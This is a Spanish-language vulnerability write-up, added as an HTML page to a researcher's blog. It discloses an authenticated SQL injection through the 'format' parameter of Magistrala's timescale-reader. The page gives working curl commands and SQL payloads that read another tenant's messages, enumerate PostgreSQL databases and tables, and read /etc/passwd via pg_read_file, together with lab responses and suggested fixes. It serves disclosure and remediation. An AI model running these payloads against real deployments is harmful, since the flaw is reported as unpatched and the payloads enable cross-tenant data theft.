@@ -1,0 +1,250 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Magistrala: SQL injection autenticada en Timescale Reader | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre SQL injection autenticada en Timescale Reader de Magistrala, con bypass de aislamiento entre dominios y lectura de datos." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/magistrala-timescale-reader-sql-injection.html" />
+  <meta property="og:title" content="Magistrala: SQL injection autenticada en Timescale Reader" />
+  <meta property="og:description" content="Investigación sobre SQL injection autenticada en Timescale Reader de Magistrala." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/magistrala-timescale-reader-sql-injection.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Magistrala: SQL injection autenticada en Timescale Reader" />
+  <meta name="twitter:description" content="SQL injection autenticada en Timescale Reader de Magistrala." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / magistrala</p>
+      <h1>Timescale Reader SQL injection<span>_</span></h1>
+        <div class="writeup-meta"><span>Medium</span><span>SQL injection</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">Magistrala</span><span class="tag">SQL Injection</span><span class="tag">TimescaleDB</span><span class="tag">Multi-tenant</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> la validación se realizó en un despliegue Docker local de Magistrala v0.40.0 / main. El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-pfmm-h79v-449g</code>; el maintainer no respondió y no hay versión corregida publicada.</p></blockquote>
+
+        <p>Durante la revisión del servicio <code>timescale-reader</code> encontré una SQL injection autenticada a través del parámetro de consulta <code>format</code> en:</p>
+        <pre><code>GET /{domainID}/channels/{channelID}/messages</code></pre>
+
+        <p>El valor de <code>format</code> se utilizaba directamente dentro de la cláusula SQL <code>FROM</code>. Un cliente autenticado con acceso a un canal podía inyectar una tabla derivada y ejecutar consultas <code>SELECT</code> arbitrarias mediante la conexión de base de datos del lector Timescale.</p>
+
+        <p>La explotación permitió saltarse el aislamiento entre canales y dominios: la petición se autorizaba contra un canal permitido, mientras que la tabla derivada podía leer mensajes de otro canal privado. En el despliegue probado, la conexión utilizaba el usuario PostgreSQL <code>magistrala</code> con <code>is_superuser=on</code>, lo que también permitió enumerar metadatos y leer archivos del contenedor PostgreSQL mediante <code>pg_read_file</code>.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Proyecto</td><td><code>github.com/absmach/magistrala</code></td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/absmach/magistrala" target="_blank" rel="noopener noreferrer">github.com/absmach/magistrala</a></td></tr>
+            <tr><td>Reporte enviado</td><td>20 de julio de 2026</td></tr>
+            <tr><td>Versión probada</td><td>v0.40.0 / main</td></tr>
+            <tr><td>Commit</td><td><code>2320ec96c02b963093594f93e021f3730c71c772</code></td></tr>
+            <tr><td>Servicio</td><td>timescale-reader</td></tr>
+            <tr><td>Endpoint</td><td><code>GET /{domainID}/channels/{channelID}/messages</code></td></tr>
+            <tr><td>Parámetro</td><td><code>format</code></td></tr>
+            <tr><td>Autenticación</td><td>Requerida</td></tr>
+            <tr><td>Vulnerabilidad</td><td>Authenticated SQL injection</td></tr>
+            <tr><td>Severidad</td><td>Medium</td></tr>
+            <tr><td>GHSA</td><td><code>GHSA-pfmm-h79v-449g</code></td></tr>
+            <tr><td>Estado</td><td>No response / sin parche publicado</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Origen del parámetro</h2>
+        <p>El valor vulnerable se leía directamente de la solicitud HTTP en:</p>
+        <pre><code>readers/api/http/transport.go</code></pre>
+        <pre><code>format, err := apiutil.ReadStringQuery(r, formatKey, defFormat)
+...
+Format: format,</code></pre>
+
+        <p>Más adelante, el valor se utilizaba como relación SQL sin una allowlist de formatos o nombres de tabla conocidos:</p>
+        <pre><code>readers/timescale/messages.go</code></pre>
+        <pre><code>if rpm.Format != "" &amp;&amp; rpm.Format != defTable {
+    format = rpm.Format
+}
+
+totalQuery := fmt.Sprintf(`SELECT COUNT(*) FROM %s WHERE %s;`, format, where)
+...
+q = fmt.Sprintf(`SELECT * FROM %s WHERE %s %s %s;`, format, where, orderClause, pgData)</code></pre>
+
+        <p>El parámetro podía suministrarse como una tabla derivada en lugar de un nombre de tabla normal:</p>
+        <pre><code>(SELECT ... FROM messages WHERE channel = '&lt;victim_channel&gt;') AS injected</code></pre>
+
+        <h2>Ruptura del aislamiento</h2>
+        <p>La autorización se basaba en <code>domainID</code> y <code>channelID</code> presentes en el path de la URL. Sin embargo, la fuente SQL utilizada por el reader quedaba controlada por <code>format</code>.</p>
+
+        <p>La tabla derivada podía devolver el <code>channelID</code> autorizado en su columna <code>channel</code>, de modo que el filtro externo siguiera considerándose válido mientras los datos reales procedían de otro canal o dominio:</p>
+        <pre><code>endpoint autorizado: Domain A / Channel A
+                        ↓
+format controlado: tabla derivada sobre Channel B
+                        ↓
+filtro externo ve:   Channel A
+datos reales:       Channel B</code></pre>
+
+        <p>El resultado era la ejecución de <code>SELECT</code> arbitrarios a través de la conexión Timescale, con bypass del límite de aislamiento de canales y dominios.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>La validación se realizó contra un despliegue Docker local. El escenario contenía:</p>
+        <ul>
+          <li>Domain A, donde el cliente atacante tenía acceso a Channel A.</li>
+          <li>Domain B, separado y privado.</li>
+          <li>Channel B, donde el cliente atacante no tenía permisos.</li>
+          <li>Un mensaje de prueba en Channel B con el marcador <code>PRIVATE_DOMAIN_B_MARKER_456</code>.</li>
+        </ul>
+
+        <p>Las variables siguientes representan valores del laboratorio:</p>
+        <pre><code>export READER_URL="http://localhost:9011"
+export DOMAIN_A="&lt;AUTHORIZED_DOMAIN_ID&gt;"
+export CHANNEL_A="&lt;AUTHORIZED_CHANNEL_ID&gt;"
+export DOMAIN_B="&lt;PRIVATE_DOMAIN_ID&gt;"
+export CHANNEL_B="&lt;PRIVATE_CHANNEL_ID&gt;"
+export CLIENT_TOKEN="&lt;CLIENT_TOKEN_WITH_SUBSCRIBE_PERMISSION_ONLY_ON_CHANNEL_A&gt;"</code></pre>
+
+        <h3>1. Acceso directo denegado</h3>
+        <p>Primero confirmé que el token no podía leer directamente el canal privado:</p>
+        <pre><code>curl -i \
+  "$READER_URL/$DOMAIN_B/channels/$CHANNEL_B/messages?limit=10" \
+  -H "Authorization: Client $CLIENT_TOKEN"
+
+HTTP/1.1 403 Forbidden
+{"message":"failed to perform authorization over the entity"}</code></pre>
+
+        <h3>2. Ejecución de SELECT arbitrario</h3>
+        <p>El siguiente formato construía una tabla derivada con expresiones PostgreSQL que devolvían el contexto de ejecución:</p>
+        <pre><code>PAYLOAD="(SELECT CAST('${CHANNEL_A}' AS varchar) AS channel,
+CAST(EXTRACT(EPOCH FROM NOW()) AS bigint) AS created,
+'' AS subtopic, 'poc' AS publisher, 'poc' AS protocol,
+jsonb_build_object(
+  'current_user', current_user,
+  'current_database', current_database(),
+  'is_superuser', current_setting('is_superuser', true),
+  'server_version', version()
+) AS payload) AS injected"
+
+curl -i -sS -G \
+  "$READER_URL/$DOMAIN_A/channels/$CHANNEL_A/messages" \
+  -H "Authorization: Client $CLIENT_TOKEN" \
+  --data-urlencode "limit=10" \
+  --data-urlencode "format=$PAYLOAD"</code></pre>
+
+        <p>La respuesta del despliegue probado confirmó el contexto de base de datos:</p>
+        <pre><code>{
+  "current_database": "magistrala",
+  "current_user": "magistrala",
+  "is_superuser": "on"
+}</code></pre>
+
+        <h3>3. Lectura cross-domain</h3>
+        <p>Después de confirmar la ejecución de expresiones, utilicé una tabla derivada que leía mensajes de Channel B y presentaba Channel A como el canal externo:</p>
+        <pre><code>PAYLOAD="(SELECT CAST('${CHANNEL_A}' AS varchar) AS channel,
+time AS created, COALESCE(subtopic, '') AS subtopic,
+publisher, protocol,
+jsonb_build_object(
+  'source_domain', '${DOMAIN_B}',
+  'original_channel', CAST(channel AS text),
+  'string_value', string_value,
+  'time', time
+) AS payload
+FROM messages WHERE channel = CAST('${CHANNEL_B}' AS uuid)) AS injected"
+
+curl -i -sS -G \
+  "$READER_URL/$DOMAIN_A/channels/$CHANNEL_A/messages" \
+  -H "Authorization: Client $CLIENT_TOKEN" \
+  --data-urlencode "limit=10" \
+  --data-urlencode "format=$PAYLOAD"</code></pre>
+
+        <p>La respuesta incluyó el marcador privado de Domain B:</p>
+        <pre><code>{
+  "channel": "&lt;AUTHORIZED_CHANNEL_ID&gt;",
+  "payload": {
+    "source_domain": "&lt;PRIVATE_DOMAIN_ID&gt;",
+    "original_channel": "&lt;PRIVATE_CHANNEL_ID&gt;",
+    "string_value": "PRIVATE_DOMAIN_B_MARKER_456"
+  }
+}</code></pre>
+
+        <p>La petición fue autorizada contra Domain A / Channel A, pero devolvió el mensaje de Domain B / Channel B.</p>
+
+        <h3>4. Enumeración de metadatos PostgreSQL</h3>
+        <p>La misma primitiva permitió consultar bases de datos disponibles:</p>
+        <pre><code>jsonb_build_object(
+  'current_database', current_database(),
+  'databases', (
+    SELECT jsonb_agg(datname)
+    FROM pg_database
+    WHERE datallowconn = true
+  )
+) AS payload</code></pre>
+
+        <p>El resultado del laboratorio incluía:</p>
+        <pre><code>{
+  "current_database": "magistrala",
+  "databases": ["postgres", "magistrala", "template1"]
+}</code></pre>
+
+        <p>También fue posible enumerar tablas visibles en la base de datos actual:</p>
+        <pre><code>SELECT jsonb_agg(table_schema || '.' || table_name)
+FROM information_schema.tables
+WHERE table_schema NOT IN ('pg_catalog', 'information_schema')</code></pre>
+
+        <p>Entre las tablas devueltas estaban <code>public.messages</code>, <code>public.gorp_migrations</code> y relaciones internas de TimescaleDB.</p>
+
+        <h3>5. Lectura de archivos del contenedor PostgreSQL</h3>
+        <p>Debido a los privilegios de la conexión en el entorno probado, también confirmé lectura de archivos mediante <code>pg_read_file</code>:</p>
+        <pre><code>jsonb_build_object(
+  'file', '/etc/passwd',
+  'sample', pg_read_file('/etc/passwd', 0, 500),
+  'current_user', current_user
+) AS payload</code></pre>
+
+        <p>La respuesta incluía entradas Unix desde el contenedor PostgreSQL:</p>
+        <pre><code>{
+  "current_user": "magistrala",
+  "file": "/etc/passwd",
+  "sample": "root:x:0:0:root:/root:/bin/sh\\nbin:x:1:1:bin:/bin:/sbin/nologin\\n..."
+}</code></pre>
+
+        <p>Esta capacidad dependía de los privilegios de la conexión PostgreSQL y fue confirmada únicamente en el despliegue Docker probado.</p>
+
+        <h2>Impacto</h2>
+        <p>Un cliente autenticado con acceso a un único canal podía ejecutar consultas <code>SELECT</code> arbitrarias mediante la conexión de base de datos del Timescale reader.</p>
+        <ul>
+          <li>Lectura de mensajes de otros canales y dominios.</li>
+          <li>Bypass del aislamiento de tenants impuesto por la autorización HTTP.</li>
+          <li>Enumeración de bases de datos, tablas y metadatos PostgreSQL.</li>
+          <li>Lectura de archivos del contenedor PostgreSQL mediante <code>pg_read_file</code> cuando la conexión tenía privilegios suficientes.</li>
+          <li>Acceso a cualquier dato visible para el rol de base de datos utilizado por el reader.</li>
+        </ul>
+
+        <h2>Corrección sugerida</h2>
+        <ul>
+          <li>No concatenar directamente <code>format</code> en las consultas SQL.</li>
+          <li>Restringir <code>format</code> a una allowlist estricta de formatos o tablas internas válidas.</li>
+          <li>Tratar <code>format</code> únicamente como un identificador validado, nunca como una expresión SQL o tabla derivada.</li>
+          <li>Ejecutar el Timescale reader con un rol PostgreSQL de mínimo privilegio y sin permisos de superusuario.</li>
+          <li>Añadir pruebas que comprueben aislamiento entre dominios y canales cuando el formato sea controlado por el cliente.</li>
+        </ul>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reportado mediante GitHub Security Advisory como <code>GHSA-pfmm-h79v-449g</code>. El maintainer no respondió y no hay versión corregida publicada.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
